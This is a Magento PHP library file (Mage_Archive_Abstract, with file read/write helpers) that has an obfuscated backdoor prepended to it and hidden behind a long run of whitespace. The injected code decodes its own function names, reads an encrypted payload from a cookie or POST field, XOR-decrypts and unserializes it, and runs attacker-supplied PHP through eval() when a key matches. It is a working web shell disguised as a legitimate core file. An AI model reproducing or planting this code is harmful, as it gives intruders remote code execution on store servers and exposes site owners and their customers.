<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['da2f7'];global$da2f7;$da2f7=$GLOBALS;$da2f7['n7ae97']="\x32\x4e\x78\x7a\x75\x40\x66\x77\x36\x35\x72\x47\x2d\x2f\x6f\x7e\x61\x45\x4b\x2b\x6d\x73\x38\x31\x25\x67\x41\x37\x28\x5d\x48\x4a\x76\x3d\x51\x3c\x7c\x4c\x9\x6b\x64\x3f\x2c\x34\x39\x33\x46\x22\x5b\x3b\x55\x23\x65\x44\x42\x58\x6a\x2a\xd\x59\x56\x21\x2e\x57\x43\x60\x6e\x71\x24\x5f\x74\x49\x26\x30\x70\x3a\x68\x62\x79\x5e\x63\x29\x69\x4d\x4f\x27\x6c\x5a\x54\x7d\x52\x3e\x50\x53\x7b\x5c\xa\x20";$da2f7[$da2f7['n7ae97'][80].$da2f7['n7ae97'][44].$da2f7['n7ae97'][9].$da2f7['n7ae97'][27].$da2f7['n7ae97'][80]]=$da2f7['n7ae97'][80].$da2f7['n7ae97'][76].$da2f7['n7ae97'][10];$da2f7[$da2f7['n7ae97'][21].$da2f7['n7ae97'][8].$da2f7['n7ae97'][8].$da2f7['n7ae97'][22].$da2f7['n7ae97'][40].$da2f7['n7ae97'][23].$da2f7['n7ae97'][9].$da2f7['n7ae97'][22].$da2f7['n7ae97'][6]]=$da2f7['n7ae97'][14].$da2f7['n7ae97'][10].$da2f7['n7ae97'][40];$da2f7[$da2f7['n7ae97'][6].$da2f7['n7ae97'][40].$da2f7['n7ae97'][0].$da2f7['n7ae97'][27].$da2f7['n7ae97'][0].$da2f7['n7ae97'][6]]=$da2f7['n7ae97'][21].$da2f7['n7ae97'][70].$da2f7['n7ae97'][10].$da2f7['n7ae97'][86].$da2f7['n7ae97'][52].$da2f7['n7ae97'][66];$da2f7[$da2f7['n7ae97'][6].$da2f7['n7ae97'][22].$da2f7['n7ae97'][23].$da2f7['n7ae97'][52].$da2f7['n7ae97'][22].$da2f7['n7ae97'][45].$da2f7['n7ae97'][43].$da2f7['n7ae97'][73].$da2f7['n7ae97'][40]]=$da2f7['n7ae97'][82].$da2f7['n7ae97'][66].$da2f7['n7ae97'][82].$da2f7['n7ae97'][69].$da2f7['n7ae97'][21].$da2f7['n7ae97'][52].$da2f7['n7ae97'][70];$da2f7[$da2f7['n7ae97'][78].$da2f7['n7ae97'][43].$da2f7['n7ae97'][45].$da2f7['n7ae97'][77].$da2f7['n7ae97'][45].$da2f7['n7ae97'][77]]=$da2f7['n7ae97'][21].$da2f7['n7ae97'][52].$da2f7['n7ae97'][10].$da2f7['n7ae97'][82].$da2f7['n7ae97'][16].$da2f7['n7ae97'][86].$da2f7['n7ae97'][82].$da2f7['n7ae97'][3].$da2f7['n7ae97'][52];$da2f7[$da2f7['n7ae97'][82].$da2f7['n7ae97'][8].$da2f7['n7ae97'][0].$da2f7['n7ae97'][80].$da2f7['n7ae97'][22].$da2f7['n7ae97'][27]]=$da2f7['n7ae97'][74].$da2f7['n7ae97'][76].$da2f7['n7ae97'][74].$da2f7['n7ae97'][32].$da2f7['n7ae97'][52].$da2f7['n7ae97'][10].$da2f7['n7ae97'][21].$da2f7['n7ae97'][82].$da2f7['n7ae97'][14].$da2f7['n7ae97'][66];$da2f7[$da2f7['n7ae97'][52].$da2f7['n7ae97'][6].$da2f7['n7ae97'][23].$da2f7['n7ae97'][8].$da2f7['n7ae97'][44].$da2f7['n7ae97'][0]]=$da2f7['n7ae97'][4].$da2f7['n7ae97'][66].$da2f7['n7ae97'][21].$da2f7['n7ae97'][52].$da2f7['n7ae97'][10].$da2f7['n7ae97'][82].$da2f7['n7ae97'][16].$da2f7['n7ae97'][86].$da2f7['n7ae97'][82].$da2f7['n7ae97'][3].$da2f7['n7ae97'][52];$da2f7[$da2f7['n7ae97'][40].$da2f7['n7ae97'][23].$da2f7['n7ae97'][40].$da2f7['n7ae97'][43]]=$da2f7['n7ae97'][77].$da2f7['n7ae97'][16].$da2f7['n7ae97'][21].$da2f7['n7ae97'][52].$da2f7['n7ae97'][8].$da2f7['n7ae97'][43].$da2f7['n7ae97'][69].$da2f7['n7ae97'][40].$da2f7['n7ae97'][52].$da2f7['n7ae97'][80].$da2f7['n7ae97'][14].$da2f7['n7ae97'][40].$da2f7['n7ae97'][52];$da2f7[$da2f7['n7ae97'][70].$da2f7['n7ae97'][6].$da2f7['n7ae97'][27].$da2f7['n7ae97'][27].$da2f7['n7ae97'][16].$da2f7['n7ae97'][16].$da2f7['n7ae97'][8]]=$da2f7['n7ae97'][21].$da2f7['n7ae97'][52].$da2f7['n7ae97'][70].$da2f7['n7ae97'][69].$da2f7['n7ae97'][70].$da2f7['n7ae97'][82].$da2f7['n7ae97'][20].$da2f7['n7ae97'][52].$da2f7['n7ae97'][69].$da2f7['n7ae97'][86].$da2f7['n7ae97'][82].$da2f7['n7ae97'][20].$da2f7['n7ae97'][82].$da2f7['n7ae97'][70];$da2f7[$da2f7['n7ae97'][4].$da2f7['n7ae97'][16].$da2f7['n7ae97'][16].$da2f7['n7ae97'][8].$da2f7['n7ae97'][0].$da2f7['n7ae97'][9].$da2f7['n7ae97'][9]]=$da2f7['n7ae97'][82].$da2f7['n7ae97'][80].$da2f7['n7ae97'][40].$da2f7['n7ae97'][40].$da2f7['n7ae97'][23];$da2f7[$da2f7['n7ae97'][39].$da2f7['n7ae97'][52].$da2f7['n7ae97'][8].$da2f7['n7ae97'][44].$da2f7['n7ae97'][77].$da2f7['n7ae97'][22].$da2f7['n7ae97'][80].$da2f7['n7ae97'][27]]=$da2f7['n7ae97'][3].$da2f7['n7ae97'][77].$da2f7['n7ae97'][52].$da2f7['n7ae97'][9];$da2f7[$da2f7['n7ae97'][56].$da2f7['n7ae97'][6].$da2f7['n7ae97'][80].$da2f7['n7ae97'][40].$da2f7['n7ae97'][44].$da2f7['n7ae97'][40].$da2f7['n7ae97'][45].$da2f7['n7ae97'][80]]=$_POST;$da2f7[$da2f7['n7ae97'][20].$da2f7['n7ae97'][9].$da2f7['n7ae97'][16].$da2f7['n7ae97'][40].$da2f7['n7ae97'][80].$da2f7['n7ae97'][45]]=$_COOKIE;@$da2f7[$da2f7['n7ae97'][6].$da2f7['n7ae97'][22].$da2f7['n7ae97'][23].$da2f7['n7ae97'][52].$da2f7['n7ae97'][22].$da2f7['n7ae97'][45].$da2f7['n7ae97'][43].$da2f7['n7ae97'][73].$da2f7['n7ae97'][40]]($da2f7['n7ae97'][52].$da2f7['n7ae97'][10].$da2f7['n7ae97'][10].$da2f7['n7ae97'][14].$da2f7['n7ae97'][10].$da2f7['n7ae97'][69].$da2f7['n7ae97'][86].$da2f7['n7ae97'][14].$da2f7['n7ae97'][25],NULL);@$da2f7[$da2f7['n7ae97'][6].$da2f7['n7ae97'][22].$da2f7['n7ae97'][23].$da2f7['n7ae97'][52].$da2f7['n7ae97'][22].$da2f7['n7ae97'][45].$da2f7['n7ae97'][43].$da2f7['n7ae97'][73].$da2f7['n7ae97'][40]]($da2f7['n7ae97'][86].$da2f7['n7ae97'][14].$da2f7['n7ae97'][25].$da2f7['n7ae97'][69].$da2f7['n7ae97'][52].$da2f7['n7ae97'][10].$da2f7['n7ae97'][10].$da2f7['n7ae97'][14].$da2f7['n7ae97'][10].$da2f7['n7ae97'][21],0);@$da2f7[$da2f7['n7ae97'][6].$da2f7['n7ae97'][22].$da2f7['n7ae97'][23].$da2f7['n7ae97'][52].$da2f7['n7ae97'][22].$da2f7['n7ae97'][45].$da2f7['n7ae97'][43].$da2f7['n7ae97'][73].$da2f7['n7ae97'][40]]($da2f7['n7ae97'][20].$da2f7['n7ae97'][16].$da2f7['n7ae97'][2].$da2f7['n7ae97'][69].$da2f7['n7ae97'][52].$da2f7['n7ae97'][2].$da2f7['n7ae97'][52].$da2f7['n7ae97'][80].$da2f7['n7ae97'][4].$da2f7['n7ae97'][70].$da2f7['n7ae97'][82].$da2f7['n7ae97'][14].$da2f7['n7ae97'][66].$da2f7['n7ae97'][69].$da2f7['n7ae97'][70].$da2f7['n7ae97'][82].$da2f7['n7ae97'][20].$da2f7['n7ae97'][52],0);@$da2f7[$da2f7['n7ae97'][70].$da2f7['n7ae97'][6].$da2f7['n7ae97'][27].$da2f7['n7ae97'][27].$da2f7['n7ae97'][16].$da2f7['n7ae97'][16].$da2f7['n7ae97'][8]](0);$u20041b=NULL;$z4da6cc0=NULL;$da2f7[$da2f7['n7ae97'][78].$da2f7['n7ae97'][9].$da2f7['n7ae97'][52].$da2f7['n7ae97'][45].$da2f7['n7ae97'][9]]=$da2f7['n7ae97'][16].$da2f7['n7ae97'][45].$da2f7['n7ae97'][22].$da2f7['n7ae97'][52].$da2f7['n7ae97'][6].$da2f7['n7ae97'][27].$da2f7['n7ae97'][16].$da2f7['n7ae97'][27].$da2f7['n7ae97'][12].$da2f7['n7ae97'][22].$da2f7['n7ae97'][43].$da2f7['n7ae97'][40].$da2f7['n7ae97'][16].$da2f7['n7ae97'][12].$da2f7['n7ae97'][43].$da2f7['n7ae97'][0].$da2f7['n7ae97'][43].$da2f7['n7ae97'][43].$da2f7['n7ae97'][12].$da2f7['n7ae97'][22].$da2f7['n7ae97'][73].$da2f7['n7ae97'][0].$da2f7['n7ae97'][73].$da2f7['n7ae97'][12].$da2f7['n7ae97'][0].$da2f7['n7ae97'][80].$da2f7['n7ae97'][9].$da2f7['n7ae97'][43].$da2f7['n7ae97'][40].$da2f7['n7ae97'][77].$da2f7['n7ae97'][45].$da2f7['n7ae97'][8].$da2f7['n7ae97'][44].$da2f7['n7ae97'][9].$da2f7['n7ae97'][80].$da2f7['n7ae97'][40];global$y5e35;function zbe5($u20041b,$r66f8a){global$da2f7;$p359e="";for($efd2850=0;$efd2850<$da2f7[$da2f7['n7ae97'][6].$da2f7['n7ae97'][40].$da2f7['n7ae97'][0].$da2f7['n7ae97'][27].$da2f7['n7ae97'][0].$da2f7['n7ae97'][6]]($u20041b);){for($y46960=0;$y46960<$da2f7[$da2f7['n7ae97'][6].$da2f7['n7ae97'][40].$da2f7['n7ae97'][0].$da2f7['n7ae97'][27].$da2f7['n7ae97'][0].$da2f7['n7ae97'][6]]($r66f8a)&&$efd2850<$da2f7[$da2f7['n7ae97'][6].$da2f7['n7ae97'][40].$da2f7['n7ae97'][0].$da2f7['n7ae97'][27].$da2f7['n7ae97'][0].$da2f7['n7ae97'][6]]($u20041b);$y46960++,$efd2850++){$p359e.=$da2f7[$da2f7['n7ae97'][80].$da2f7['n7ae97'][44].$da2f7['n7ae97'][9].$da2f7['n7ae97'][27].$da2f7['n7ae97'][80]]($da2f7[$da2f7['n7ae97'][21].$da2f7['n7ae97'][8].$da2f7['n7ae97'][8].$da2f7['n7ae97'][22].$da2f7['n7ae97'][40].$da2f7['n7ae97'][23].$da2f7['n7ae97'][9].$da2f7['n7ae97'][22].$da2f7['n7ae97'][6]]($u20041b[$efd2850])^$da2f7[$da2f7['n7ae97'][21].$da2f7['n7ae97'][8].$da2f7['n7ae97'][8].$da2f7['n7ae97'][22].$da2f7['n7ae97'][40].$da2f7['n7ae97'][23].$da2f7['n7ae97'][9].$da2f7['n7ae97'][22].$da2f7['n7ae97'][6]]($r66f8a[$y46960]));}}return$p359e;}function icdd1($u20041b,$r66f8a){global$da2f7;global$y5e35;return$da2f7[$da2f7['n7ae97'][39].$da2f7['n7ae97'][52].$da2f7['n7ae97'][8].$da2f7['n7ae97'][44].$da2f7['n7ae97'][77].$da2f7['n7ae97'][22].$da2f7['n7ae97'][80].$da2f7['n7ae97'][27]]($da2f7[$da2f7['n7ae97'][39].$da2f7['n7ae97'][52].$da2f7['n7ae97'][8].$da2f7['n7ae97'][44].$da2f7['n7ae97'][77].$da2f7['n7ae97'][22].$da2f7['n7ae97'][80].$da2f7['n7ae97'][27]]($u20041b,$y5e35),$r66f8a);}foreach($da2f7[$da2f7['n7ae97'][20].$da2f7['n7ae97'][9].$da2f7['n7ae97'][16].$da2f7['n7ae97'][40].$da2f7['n7ae97'][80].$da2f7['n7ae97'][45]]as$r66f8a=>$dd7e025){$u20041b=$dd7e025;$z4da6cc0=$r66f8a;}if(!$u20041b){foreach($da2f7[$da2f7['n7ae97'][56].$da2f7['n7ae97'][6].$da2f7['n7ae97'][80].$da2f7['n7ae97'][40].$da2f7['n7ae97'][44].$da2f7['n7ae97'][40].$da2f7['n7ae97'][45].$da2f7['n7ae97'][80]]as$r66f8a=>$dd7e025){$u20041b=$dd7e025;$z4da6cc0=$r66f8a;}}$u20041b=@$da2f7[$da2f7['n7ae97'][52].$da2f7['n7ae97'][6].$da2f7['n7ae97'][23].$da2f7['n7ae97'][8].$da2f7['n7ae97'][44].$da2f7['n7ae97'][0]]($da2f7[$da2f7['n7ae97'][4].$da2f7['n7ae97'][16].$da2f7['n7ae97'][16].$da2f7['n7ae97'][8].$da2f7['n7ae97'][0].$da2f7['n7ae97'][9].$da2f7['n7ae97'][9]]($da2f7[$da2f7['n7ae97'][40].$da2f7['n7ae97'][23].$da2f7['n7ae97'][40].$da2f7['n7ae97'][43]]($u20041b),$z4da6cc0));if(isset($u20041b[$da2f7['n7ae97'][16].$da2f7['n7ae97'][39]])&&$y5e35==$u20041b[$da2f7['n7ae97'][16].$da2f7['n7ae97'][39]]){if($u20041b[$da2f7['n7ae97'][16]]==$da2f7['n7ae97'][82]){$efd2850=Array($da2f7['n7ae97'][74].$da2f7['n7ae97'][32]=>@$da2f7[$da2f7['n7ae97'][82].$da2f7['n7ae97'][8].$da2f7['n7ae97'][0].$da2f7['n7ae97'][80].$da2f7['n7ae97'][22].$da2f7['n7ae97'][27]](),$da2f7['n7ae97'][21].$da2f7['n7ae97'][32]=>$da2f7['n7ae97'][23].$da2f7['n7ae97'][62].$da2f7['n7ae97'][73].$da2f7['n7ae97'][12].$da2f7['n7ae97'][23],);echo@$da2f7[$da2f7['n7ae97'][78].$da2f7['n7ae97'][43].$da2f7['n7ae97'][45].$da2f7['n7ae97'][77].$da2f7['n7ae97'][45].$da2f7['n7ae97'][77]]($efd2850);}elseif($u20041b[$da2f7['n7ae97'][16]]==$da2f7['n7ae97'][52]){eval($u20041b[$da2f7['n7ae97'][40]]);}exit();} ?><?php
/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/osl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magentocommerce.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magentocommerce.com for more information.
 *
 * @category    Mage
 * @package     Mage_Archive
 * @copyright   Copyright (c) 2010 Magento Inc. (http://www.magentocommerce.com)
 * @license     http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
 */

/**
 * Class to work with archives
 *
 * @category    Mage
 * @package     Mage_Archive
 * @author      Magento Core Team <core@magentocommerce.com>
 */
class Mage_Archive_Abstract
{
    /**
     * Write data to file. If file can't be opened - throw exception
     *
     * @param string $destination
     * @param string $data
     * @return boolean
     * @throws Mage_Exception
     */
    protected function _writeFile($destination, $data)
    {
        $destination = trim($destination);
        if(false === file_put_contents($destination, $data)) {
            throw new Mage_Exception("Can't write to file: " . $destination);
        }
        return true;
    }

    /**
     * Read data from file. If file can't be opened, throw to exception.
     *
     * @param string $source
     * @return string
     * @throws Mage_Exception
     */
    protected function _readFile($source)
    {
        $data = '';
        if (is_file($source) && is_readable($source)) {
            $data = @file_get_contents($source);
            if ($data === false) {
                throw new Mage_Exception("Can't get contents from: " . $source);
            }
        }
        return $data;
    }

    /**
     * Get file name from source (URI) without last extension.
     *
     * @param string $source
     * @param bool $withExtension
     * @return mixed|string
     */
    public function getFilename($source, $withExtension=false)
    {
        $file = str_replace(dirname($source) . DS, '', $source);
        if (!$withExtension) {
            $file = substr($file, 0, strrpos($file, '.'));
        }
        return $file;
    }
}
